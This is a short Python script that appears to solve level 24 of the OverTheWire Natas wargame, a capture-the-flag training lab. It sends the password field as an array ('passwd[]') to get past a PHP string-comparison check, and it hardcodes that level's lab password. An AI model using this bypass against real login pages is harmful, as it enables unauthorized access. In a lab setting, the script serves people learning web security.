import requests

username = "natas24"
password = "OsRmXFguozKpTZZ5X14zNO43379LZveg"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

response = session.post(
    url, data={"passwd[]": "anything"}, auth=(username, password))
content = response.text
print(content)
